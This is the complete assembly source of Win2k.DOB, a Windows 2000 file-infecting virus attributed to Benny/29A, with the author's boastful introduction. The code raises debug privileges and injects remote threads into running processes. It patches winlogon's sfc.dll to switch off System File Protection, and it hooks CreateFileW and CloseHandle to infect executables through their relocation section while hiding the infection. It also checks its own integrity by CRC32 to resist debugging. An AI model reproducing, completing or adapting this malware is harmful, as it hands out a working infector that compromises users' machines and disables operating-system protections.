
COMMENT#

                           ⁄¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬ø
                           √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥ 
                           √≈≈≈≈¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡≈≈≈≈¥ 
                           √≈≈≈¥    Win2k.DOB     √≈≈≈¥ 
                           √≈≈≈¥   by Benny/29A   √≈≈≈¥
                           √≈≈≈≈¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬≈≈≈≈¥
                           √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥
                           ¿¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡Ÿ



Hello dear reader,

here is my another Win2k infector. This one is multi-process resident and featurez
some small kind of stealth and runtime SFP disabling! The main viral code worx with
all processes in the system and tries to inflitrate them. IF the process in
winlogon.exe, it createz remote thread which will overwrite code that handlez System
File Protection in Windows 2000. There's no need to restart computer, from the
execution ALL filez protected by SFP are now unprotected! I used the same method
which is described in article about SFC disabling in 29A-6 magazine. I have to
mentioned that this code is coded by me and also Ratter of 29A.

In the case the found process is not winlogon.exe it triez to create remote thread
which will hook CloseHandle and CreateFileW APIZ there. The mentioned semi-stealth
mechanism worx in this way - when infected program tries to open infected file with
CreateFileW API, virus will disinfect it and pass the execution to the API and host.
When host program tries to close file by CloseHandle API, virus will try to infect
it by my favourite method - overwritting of relocation section. I had this semi-stealth
mechanism (semi becoz infection via CloseHandle doesnt always work - file is not alwayz
opened with all required access rightz so many timez the infection will fail - and for now
I dont know how to recieve filename from HANDLE by Win2k compatible way. If anyone knows
it, pleaz gimme know!) for long yearz in my head. Originaly I wanted to implement it
in Win32.Vulcano, but I was so lazy... I decided to code it now, well I know its a bit
later, but better later than never :)

Virus also chex its own integrity on the start (by CRC32) so in the case someone set
some breakpointz in the viral code, virus will not run.

I didnt test Win2k.DOB very deeply, so it is possible that it has some bugz. However,
again I didnt code it for spreading, but to show some new ideaz. I hope you will like
this virus...


(c)oded in September, 2001
Czech Republic.
#


.386p
.model	flat

include	win32api.inc
include	useful.inc
include	mz.inc
include	pe.inc


invoke	macro	api				;macro for API callz
	extrn	api:PROC			;declare API
	call	api				;call it...
endm


@SEH_SetupFrame_UnProtect	macro
	local	set_new_eh
	local	exception_handler
	local	@n

	call	set_new_eh
	pushad

	mov	ebx,dword ptr [esp+cPushad+EH_ExceptionRecord]
	cmp	dword ptr [ebx.ER_ExceptionCode],EXCEPTION_ACCESS_VIOLATION
        jne	exception_handler

	call	@n
	dd	?
@n:	mov	ebx,[ebx.ER_ExceptionInformation+4]
	push	PAGE_READWRITE
	and	ebx,0FFFFF000h
	push	2*4096
	push	ebx
	mov	eax,12345678h
_VirtualProtect = dword ptr $-4
	call	eax				;unprotect 2 pagez

exception_handler:
	popad
	xor	eax,eax
	ret

set_new_eh:					;set SEH frame
	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
endm


.data


;this is the remote thread that getz executed in infected process

rtStart	Proc
	pushad
tdelta = $+5
	@SEH_SetupFrame	<jmp	end_thread>

	mov	ebp,[esp+4]			;EBP = delta offset

	;hook 2 APIz - CloseHandle and CreateFileW

	mov	esi,12345678h
_CloseHandle = dword ptr $-4
	cmp	[esi],64EC8B55h			;check CloseHandle API...
	jne	try_cfw
	cmp	dword ptr [esi+4],000018A1h	;...code
	jne	try_cfw
	mov	eax,esi
	neg	esi
	add	esi,newCloseHandle-rtStart-5
	add	esi,12345678h
virus_base = dword ptr $-4
	mov	byte ptr [eax],0E9h		;create "JMP <virus>"
	mov	[eax+1],esi
	mov	[eax+5],90909090h		;fill with NOPs
	add	eax,9
	mov	[ebp + nextCH - tdelta],eax	;save the address

;and do the same for CreateFileW API

try_cfw:mov	esi,12345678h
_CreateFileW = dword ptr $-4
	cmp	[esi],83EC8B55h
	jne	end_thread
	cmp	word ptr [esi+4],5CECh
	jne	end_thread
	mov	eax,esi
	neg	esi
	add	esi,newCreateFileW-rtStart-5
	add	esi,[ebp + virus_base - tdelta]
	mov	byte ptr [eax],0E9h
	mov	[eax+1],esi
	mov	byte ptr [eax+5],90h
	add	eax,6
	mov	[ebp + nextCFW - tdelta],eax

end_thread:
	@SEH_RemoveFrame
	popad
	ret


;hooker for CreateFileW - disinfectz opened file from virus

newCreateFileW:
	pushad
	call	@oldCFW

	cdelta = $
bytez_CreateFileW:
	push	ebp				;overwritten code
	mov	ebp,esp
	sub	esp,5Ch
	push	12345678h			;return address
nextCFW = dword ptr $-4
	ret

@oldCFW:pop	ebp				;EBP = delta offset

	mov	ecx,12345678h
semaphore = dword ptr $-4
	jecxz	c_cfw
	xor	eax,eax
	and	[ebp + semaphore - cdelta],eax

	call	disinfect			;try to disinfect the file
	mov	[ebp + semaphore - cdelta],ebp
c_cfw:	popad
	jmp	bytez_CreateFileW		;and run the previous code


;hooker for CloseHandle - infectz file which's getting closed

newCloseHandle:
	pushad
	call	@oldCH

	hdelta = $
bytez_CloseHandle:
	push	ebp				;overwritten code
	mov	ebp,esp
	mov	eax,LARGE fs:[18h]
	push	12345678h			;return address
nextCH = dword ptr $-4
	ret

@oldCH:	pop	ebp				;EBP = delta offset

	mov	ecx,[ebp + semaphore - hdelta]
	jecxz	c_ch
	and	dword ptr [ebp + semaphore - hdelta],0

	call	tryInfect			;try to infect
	mov	[ebp + semaphore - hdelta],ebp
c_ch:	popad
	jmp	bytez_CloseHandle		;and run the previous code


tryInfect:
	mov	ebx,[esp.cPushad+8]		;get the handle
	push	ebx
	mov	eax,12345678h
_GetFileType = dword ptr $-4
	call	eax
	dec	eax
	je	c_ti				;must be FILE_TYPE_DISK
end_ti:	ret

c_ti:	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	ebx
	mov	eax,12345678h
_CreateFileMappingA = dword ptr $-4
	call	eax				;map the file
	cdq
	xchg	eax,ecx
	jecxz	end_ti
	mov	[ebp + hFile - hdelta],ecx

	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ecx
	mov	eax,12345678h
_MapViewOfFile = dword ptr $-4
	call	eax				;--- " " ---
	test	eax,eax
	je	close_file
	xchg	eax,ebx
	mov	[ebp + lpFile - hdelta],ebx
	jmp	n_open

unmap_file:
	push	12345678h
lpFile = dword ptr $-4
	mov	eax,12345678h
_UnmapViewOfFile = dword ptr $-4
	call	eax				;unmap the file
close_file:
	push	12345678h
hFile = dword ptr $-4
	call	[ebp + _CloseHandle - hdelta]	;--- " " ---
	ret


n_open:	mov	esi,[ebx.MZ_lfanew]
	add	esi,ebx
	mov	eax,[esi]
	add	eax,-IMAGE_NT_SIGNATURE
	jne	unmap_file			;must be PE file

	;discard not_executable and system filez
	cmp	word ptr [esi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	unmap_file
	mov	ax,[esi.NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	je	unmap_file
	test	ax,IMAGE_FILE_DLL
	jne	unmap_file
	test	ax,IMAGE_FILE_SYSTEM
	jne	unmap_file
	mov	al,byte ptr [esi.NT_FileHeader.OH_Subsystem]
	test	al,IMAGE_SUBSYSTEM_NATIVE
	jne	unmap_file

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	test	eax,eax
	je	unmap_file
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,esi
	lea	edx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
	mov	eax,[edx]
	test	eax,eax
	je	unmap_file
	cmp	eax,[edi.SH_VirtualAddress]
	jne	unmap_file
	cmp	[edi.SH_SizeOfRawData],virtual_end-rtStart
	jb	unmap_file			;is it large enough?

	pushad
	xor	eax,eax
	mov	edi,edx
	stosd
	stosd
	popad					;erase relocs record

	;align the section size
	mov	eax,virtual_end-rtStart
	cmp	eax,[edi.SH_VirtualSize]
	jb	o_vs
	mov	ecx,[esi.NT_OptionalHeader.OH_SectionAlignment]
	cdq
	div	ecx
	test	edx,edx
	je	o_al
	inc	eax
o_al:	mul	ecx
	mov	[edi.SH_VirtualSize],eax

o_vs:	push	dword ptr [ebp + original_ep - hdelta]

	mov	eax,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	ecx,[edi.SH_VirtualAddress]
	add	ecx,Start-rtStart
	mov	[esi.NT_OptionalHeader.OH_AddressOfEntryPoint],ecx
	mov	[ebp + original_ep - hdelta],eax
	mov	eax,[esi.NT_OptionalHeader.OH_ImageBase]
	add	[ebp + original_ep - hdelta],eax
						;set saved_entrypoint variable
	pushad
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,ebx
	lea	esi,[ebp + rtStart - hdelta]
	mov	ecx,(virtual_end-rtStart+3)/4
	rep	movsd				;overwrite relocs by virus body
	popad
	pop	dword ptr [ebp + original_ep - hdelta]
						;restore used variablez
	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
	jmp	unmap_file


disinfect:
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	push	dword ptr [esp.cPushad+32]
	call	[ebp + _CreateFileW - cdelta]		;open the file
	inc	eax
	jne	c_di
	ret

c_di:	dec	eax
	mov	[ebp + cFile - cdelta],eax
	cdq
	xor	edx,edx
	push	edx
	push	edx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	call	[ebp + _CreateFileMappingA - cdelta]	;create file mapping
	cdq
	xchg	eax,ecx
	jecxz	c_close_file
	mov	[ebp + cMapFile - cdelta],ecx

	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ecx
	call	[ebp + _MapViewOfFile - cdelta]		;map to address space
	test	eax,eax
	je	c_close_file2
	xchg	eax,ebx
	mov	[ebp + clpFile - cdelta],ebx
	jmp	n_copen

c_unmap_file:
	push	12345678h
clpFile = dword ptr $-4
	call	[ebp + _UnmapViewOfFile - cdelta]	;unmap file
c_close_file2:
	push	12345678h
cMapFile = dword ptr $-4
	call	[ebp + _CloseHandle - cdelta]		;close file mapping
c_close_file:
	push	12345678h
cFile = dword ptr $-4
	call	[ebp + _CloseHandle - cdelta]		;and the file itself
	ret

n_copen:mov	esi,[ebx.MZ_lfanew]
	add	esi,ebx
	mov	eax,[esi]
	add	eax,-IMAGE_NT_SIGNATURE
	jne	c_unmap_file			;must be PE file

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	test	eax,eax
	je	unmap_file
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,esi
	cmp	[edi],'ler.'
	jne	c_unmap_file
	cmp	dword ptr [edi+4],'co'
	jne	c_unmap_file			;must be ".reloc"
	lea	edx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
	xor	ecx,ecx
	cmp	[edx],ecx
	jne	c_unmap_file			;must be NULL
	mov	eax,[edi.SH_VirtualAddress]
	mov	[edx],eax			;restore the address field
	mov	eax,[edi.SH_VirtualSize]
	mov	[edx+4],eax			;and the size field
	xchg	eax,ecx

	mov	ecx,[edi.SH_SizeOfRawData]
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,ebx

	pushad
	push	esi
	mov	esi,edi
	lea	edi,[ebp + end_seh - cdelta]
	mov	ecx,original_ep-end_seh
l_ep:	pushad
	rep	cmpsb
	popad
	je	got_ep
	inc	esi
	jmp	l_ep
got_ep:	add	esi,original_ep-end_seh		;find the saved entrypoint in virus body
	lodsd
	pop	esi
	sub	eax,[esi.NT_OptionalHeader.OH_ImageBase]
	mov	[esi.NT_OptionalHeader.OH_AddressOfEntryPoint],eax
	popad					;restore it
	rep	stosb				;and overwrite body with NULLs

	jmp	c_unmap_file

rtStart	EndP


signature	db	0,'[Win2k.DOB], multi-process stealth project by Benny/29A',0
						;little signature ;-)


; !!! VIRAL CODE STARTS HERE !!!

Start:	pushad
gdelta = $+5
	@SEH_SetupFrame <jmp end_seh>		;setup SEH frame

	call	check_crc32			;check viral body consistency

protected:
	mov	ebp,[esp+4]			;EBP = delta offset

	mov	edx,cs
	xor	dl,dl
	jne	end_seh				;must be under winNT/2k!

	call	get_base			;get K32 base address
	call	get_apiz			;find addresses of APIz
	call	advapi_apiz			;get ADVAPI32 apiz
	call	psapi_apiz			;get PSAPI apiz

	mov	eax,12345678h
_GetCurrentProcess = dword ptr $-4
	call	eax				;get current process pseudohandle
	lea	ecx,[ebp + p_token - gdelta]
	push	ecx
	push	20h
	push	eax
	mov	eax,12345678h
_OpenProcessToken = dword ptr $-4		;open token of our process
	call	eax
	dec	eax
	jne	err_ap

	lea	ecx,[ebp + p_luid - gdelta]
	push	ecx
	@pushsz	'SeDebugPrivilege'
	push	eax
	mov	eax,12345678h
_LookupPrivilegeValueA = dword ptr $-4		;find LUID for this priv.
	call	eax
	dec	eax
	jne	err_ap

	lea	ecx,[ebp + token_priv - gdelta]
	push	eax
	push	eax
	push	10h
	push	ecx
	push	eax
	push	dword ptr [ebp + p_token - gdelta]
	mov	eax,12345678h
_AdjustTokenPrivileges = dword ptr $-4
	call	eax				;adjust higher priviledges
						;for our process ;-)
err_ap:	lea	esi,[ebp + procz - gdelta]
	lea	eax,[ebp + tmp - gdelta]
	push	eax
	push	80h
	push	esi
	mov	eax,12345678h
_EnumProcesses = dword ptr $-4
	call	eax				;enumerate all running processes
	dec	eax
	jne	end_seh
	add	esi,4

p_search:
	lodsd					;get PID
	test	eax,eax
	je	end_ps
	call	analyse_process			;and try to infect it
	jmp	p_search

end_ps:	push	12345678h
_advapi32 = dword ptr $-4
	mov	esi,12345678h
_FreeLibrary = dword ptr $-4
	call	esi
	push	12345678h
_psapi = dword ptr $-4
	call	esi				;free ADVAPI32 and PSAPI libz
end_seh:@SEH_RemoveFrame			;remove SEH frame
	popad

	extrn	ExitProcess:PROC
	push	cs
	push	offset ExitProcess
original_ep = dword ptr $-4
	retf					;jump to host!


analyse_process	Proc
	pushad
	push	eax
	push	0
	push	43Ah
	mov	eax,12345678h
_OpenProcess = dword ptr $-4
	call	eax				;PID -> handle
	test	eax,eax
	je	end_ap
	mov	[ebp + hProcess - gdelta],eax
	push	eax

	push	eax
	lea	esi,[ebp + modz - gdelta]
	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	push	4
	push	esi
	push	eax
	mov	eax,12345678h
_EnumProcessModules = dword ptr $-4
	call	eax				;get first (main) module
	pop	ecx
	dec	eax
	jne	end_ap1

	lodsd
	lea	edi,[ebp + mod_name - gdelta]
	push	MAX_PATH
	push	edi
	push	eax
	push	ecx
	mov	eax,12345678h
_GetModuleBaseNameA = dword ptr $-4
	call	eax				;get its name
	xchg	eax,ecx
	test	ecx,ecx
	je	end_ap1

	@pushsz	'winlogon.exe'
	pop	esi
	mov	ebx,edi
	pushad
	rep	cmpsb
	popad
	je	r_winlogon			;is it winlogon?

	;nope, try to infect the process

	lea	esi,[ebp + rtStart - gdelta]
	mov	edi,virtual_end-rtStart
	call	r_create_thread
	jmp	end_ap1

r_winlogon:

	;yeah, disable SFP!

	lea	esi,[ebp + winlogon_start_rroutine - gdelta]
	mov	edi,winlogon_end_rroutine-winlogon_start_rroutine
	call	r_create_thread

end_ap1:call	[ebp + _CloseHandle - gdelta]
end_ap:	popad
	ret
analyse_process	EndP


;this proc createz remote thread

r_create_thread	Proc
        push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	edi
	push	0
	push	12345678h
hProcess = dword ptr $-4
	mov	eax,12345678h
_VirtualAllocEx = dword ptr $-4
	call	eax				;aloc there a memory
	test	eax,eax
	je	err_rcr
	xchg	eax,ebx
	mov	[ebp + virus_base - gdelta],ebx

	push	0
	push	edi
	push	esi
	push	ebx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_WriteProcessMemory = dword ptr $-4
	call	eax				;write there our code
	dec	eax
	jne	free_mem

	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	push	PAGE_READWRITE
	push	1
	push	dword ptr [ebp + _CloseHandle - gdelta]
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_VirtualProtectEx = dword ptr $-4
	call	eax				;unprotect first CloseHandle API page
	dec	eax
	jne	free_mem

	lea	ecx,[ebp + tmp - gdelta]
	push	ecx
	push	PAGE_READWRITE
	push	1
	push	dword ptr [ebp + _CreateFileW - gdelta]
	push	dword ptr [ebp + hProcess - gdelta]
	call	[ebp + _VirtualProtectEx - gdelta]	;unprotect first CreateFileW API page
	dec	eax
	jne	free_mem

	xor	edx,edx
	push	edx
	push	edx
	push	edx
	push	ebx
	push	edx
	push	edx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_CreateRemoteThread = dword ptr $-4
	call	eax				;run remote thread!
	push	eax
	call	[ebp + _CloseHandle - gdelta]
err_rcr:ret
free_mem:
	push	MEM_RELEASE
	push	0
	push	ebx
	push	dword ptr [ebp + hProcess - gdelta]
	mov	eax,12345678h
_VirtualFreeEx = dword ptr $-4
	call	eax				;free memory
	ret
r_create_thread	EndP


winlogon_start_rroutine	Proc
	pushad

	@SEH_SetupFrame_UnProtect		;set SEH frame

	@pushsz	'sfc.dll'
	mov	eax,12345678h
_GetModuleHandleA = dword ptr $-4
	call	eax				;get sfc.dll address
	test	eax,eax
	je	end_rseh
	xchg	eax,esi

	mov	eax,[esi.MZ_lfanew]
	add	eax,esi
	movzx	edx,word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edx,[edx+eax+(3*IMAGE_SIZEOF_FILE_HEADER)]
	mov	ecx,[edx.SH_SizeOfRawData]	;get size of section

	call	@s_str
@b_str:	db	0FFh,15h,8Ch,12h,93h,76h	;code to search & patch
	db	85h,0C0h
	db	0Fh,8Ch,0F1h,00h,00h,00h
	db	0Fh,84h,0EBh,00h,00h,00h
	db	3Dh,02h,01h,00h,00h
@s_str:	pop	edi
s_str:	pushad
	push	@s_str-@b_str
	pop	ecx
	rep	cmpsb				;search for code
	popad
	je	got_addr
	inc	esi
	loop	s_str
	jmp	end_rseh

got_addr:
	call	e_next

s_next:	push	0				;"patch" code
	mov	eax,12345678h
_ExitThread = dword ptr $-4
	call	eax

e_next:	pop	edi
	xchg	esi,edi
	add	edi,6
        mov	ecx,e_next-s_next
        rep	movsb				;patch sfc.dll code by our code

end_rseh:
	@SEH_RemoveFrame
	popad
	ret					;and quit

winlogon_end_rroutine:
winlogon_start_rroutine	EndP



;this procedure can retrieve base address of K32
get_base	Proc
	mov	eax,077E80000h		;get lastly used address
last_kern = dword ptr $-4
	call	check_kern		;is this address valid?
	jecxz	end_gb			;yeah, we got the address

	call	gb_table		;jump over the address table
	dd	077E00000h		;NT/W2k
	dd	077E80000h		;NT/W2k
	dd	077ED0000h		;NT/W2k
	dd	077F00000h		;NT/W2k
	dd	0BFF70000h		;95/98
gb_table:
	pop	edi			;get pointer to address table
	push	4			;get number of items in the table
	pop	esi			;to ESI
gbloop:	mov	eax,[edi+esi*4]		;get item
	call	check_kern		;is address valid?
	jecxz	end_gb			;yeah, we got the valid address
	dec	esi			;decrement ESI
	test	esi,esi			;end of table?
	jne	gbloop			;nope, try next item

	call	scan_kern		;scan the address space for K32
end_gb:	ret				;quit

check_kern:				;check if K32 address is valid
	mov	ecx,eax			;make ECX != 0
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_ck>	;setup SEH frame
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	end_ck			;nope
	mov 	ebx,[eax.MZ_lfanew]	;get pointer to PE header
	add	ebx,eax			;normalize it
	mov	ebx,[ebx]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	end_ck			;nope
	xor	ecx,ecx			;we got K32 base address
	mov	[ebp + last_kern - gdelta],eax	;save K32 base address
end_ck:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_ecx],ecx	;save ECX
	popad				;restore all registers
	ret				;if ECX == 0, address was found

SEH_hndlr macro				;macro for SEH
        @SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
        add	dword ptr [ebp + bAddr - gdelta],1000h	;explore next page
        jmp	bck			;continue execution
endm

scan_kern:				;scan address space for K32
bck:    pushad				;store all registers
	@SEH_SetupFrame	<SEH_hndlr>	;setup SEH frame
	mov	eax,077000000h		;starting/last address
bAddr = dword ptr $-4
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	pg_flt			;nope
	mov 	edi,[eax.MZ_lfanew]	;get pointer to PE header
	add	edi,eax			;normalize it
	mov	ebx,[edi]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	pg_flt			;nope
	mov	ebx,eax
	mov	esi,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	esi,[ebx.ED_Name]
	mov	esi,[esi]
	add	esi,-'NREK'
	je	end_sk
pg_flt:	xor	ecx,ecx			;we got K32 base address
	mov	[ecx],esi		;generate PAGE FAULT! search again...
end_sk:	mov	[ebp + last_kern - gdelta],eax	;save K32 base address
	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save EAX - K32 base
	popad				;restore all registers
	ret
get_base	EndP


get_apiz	Proc
	mov	esi,eax			;base of K32
	mov	edx,[esi.MZ_lfanew]
	add	edx,esi
	mov	ebx,[edx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	ebx,esi
	mov	ecx,[ebx.ED_NumberOfNames]
	mov	edx,[ebx.ED_AddressOfNames]
	add	edx,esi

	xor	eax,eax
c_find:	pushad
	add	esi,[edx+eax*4]
	push	esi
	@endsz
	mov	edi,esi
	pop	esi
	sub	edi,esi
	call	CRC32			;calculate CRC32 of the API

	push	n_apiz			;number of apiz
	pop	ecx

	call	@callz
s_apiz:	dd	082B618D4h		;GetModuleHandleA
	dd	04134D1ADh		;LoadLibraryA
	dd	0AFDF191Fh		;FreeLibrary
	dd	0FFC97C1Fh		;GetProcAddress
	dd	079C3D4BBh		;VirtualProtect
	dd	0058F9201h		;ExitThread
	dd	003690E66h		;GetCurrentProcess
	dd	033D350C4h		;OpenProcess
	dd	0DA89FC22h		;VirtualAllocEx
	dd	00E9BBAD5h		;WriteProcessMemory
	dd	0CF4A7F65h		;CreateRemoteThread
	dd	0700ED6DFh		;VirtualFreeEx
	dd	068624A9Dh		;CloseHandle
	dd	056E1B657h		;VirtualProtectEx
	dd	000D38F42h		;GetFileType
	dd	096B2D96Ch		;CreateFileMappingA
	dd	0797B49ECh		;MapViewOfFile
	dd	094524B42h		;UnmapViewOfFile
	dd	090119808h		;CreateFileW
n_apiz = ($-s_apiz)/4
@callz:	pop	edx

c_look:	cmp	[edx-4+(ecx*4)],eax	;is it our API?
	je	got_call		;yeah
	loop	c_look			;nope, look for another API in our table
c_out:	popad
	inc	eax
	loop	c_find
	ret

got_call:
	mov	edx,[ebx.ED_AddressOfOrdinals]
	mov	esi,[esp.Pushad_esi]
	add	edx,esi
	mov	eax,[esp.Pushad_eax]
	movzx	eax,word ptr [edx+eax*2]
	mov	edx,esi
	add	edx,[ebx.ED_AddressOfFunctions]
	mov	eax,[edx+eax*4]
	add	eax,esi

	lea	edx,[ebp + Start - gdelta]
	add	edx,[ebp + api_addr-4+ecx*4 - gdelta]
	mov	[edx],eax		;save it
	jmp	c_out
get_apiz	EndP


api_addr:				;where to save apiz numberz...
	dd	offset _GetModuleHandleA-Start
	dd	offset _LoadLibraryA-Start
	dd	offset _FreeLibrary-Start
	dd	offset _GetProcAddress-Start
	dd	offset _VirtualProtect-Start
	dd	offset _ExitThread-Start
	dd	offset _GetCurrentProcess-Start
	dd	offset _OpenProcess-Start
	dd	offset _VirtualAllocEx-Start
	dd	offset _WriteProcessMemory-Start
	dd	offset _CreateRemoteThread-Start
	dd	offset _VirtualFreeEx-Start
	dd	offset _CloseHandle-Start
	dd	offset _VirtualProtectEx-Start
	dd	offset _GetFileType-Start
	dd	offset _CreateFileMappingA-Start
	dd	offset _MapViewOfFile-Start
	dd	offset _UnmapViewOfFile-Start
	dd	offset _CreateFileW-Start

CRC32:	push	ecx			;procedure for calculating CRC32s
	push	edx			;at run-time
	push	ebx       
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret

;get addressez of ADVAPI32 APIz

advapi_apiz	Proc
	@pushsz	'ADVAPI32'
	mov	eax,12345678h
_LoadLibraryA = dword ptr $-4
	call	eax			;load ADVAPI32
	xchg	eax,ebx
	mov	[ebp + _advapi32 - gdelta],ebx

	@pushsz	'OpenProcessToken'
	push	ebx
	mov	esi,12345678h
_GetProcAddress = dword ptr $-4
	call	esi
	mov	[ebp + _OpenProcessToken - gdelta],eax
					;save API address
	@pushsz	'LookupPrivilegeValueA'
	push	ebx
	call	esi
	mov	[ebp + _LookupPrivilegeValueA - gdelta],eax
					;--- " " ---
	@pushsz	'AdjustTokenPrivileges'
	push	ebx
	call	esi
	mov	[ebp + _AdjustTokenPrivileges - gdelta],eax
					;--- " " ---
	ret
advapi_apiz	EndP

;get addressez of PSAPI APIz

psapi_apiz	Proc
	@pushsz	'PSAPI'
	call	[ebp + _LoadLibraryA - gdelta]	;load PSAPI
	xchg	eax,ebx
	mov	[ebp + _psapi - gdelta],ebx
	@pushsz	'EnumProcesses'
	push	ebx
	call	esi
	mov	[ebp + _EnumProcesses - gdelta],eax
					;save API address
	@pushsz	'EnumProcessModules'
	push	ebx
	call	esi
	mov	[ebp + _EnumProcessModules - gdelta],eax
					;--- " " ---

	@pushsz	'GetModuleBaseNameA'
	push	ebx
	call	esi
	mov	[ebp + _GetModuleBaseNameA - gdelta],eax
					;--- " " ---

	@pushsz	'EnumProcesses'
	push	ebx
	call	esi
	mov	[ebp + _EnumProcesses - gdelta],eax
					;--- " " ---
	ret
psapi_apiz	EndP

token_priv	dd	1
p_luid		dq	?
		dd	2
procz		dd	80h dup (?)
		dd	?
modz		dd	?
mod_name	db	MAX_PATH dup (?)
p_token		dd	?
tmp		dd	?

check_crc32:
	pop	esi
	mov	edi,check_crc32-protected
	call	CRC32				;calculate CRC32 for viral body
	cmp	eax,0D620301Eh
	jne	end_seh				;quit if does not match
	jmp	protected
virtual_end:

.code						;first generation code
FirstGeneration:

	jmp	Start

	;virtual size of virus
	db	0dh,0ah,'Virus size in memory: '
	db	'0'+((virtual_end-rtStart)/1000) mod 10
	db	'0'+((virtual_end-rtStart)/100) mod 10
	db	'0'+((virtual_end-rtStart)/10) mod 10
	db	'0'+((virtual_end-rtStart)/1) mod 10
	db	0dh,0ah
ends
End	FirstGeneration
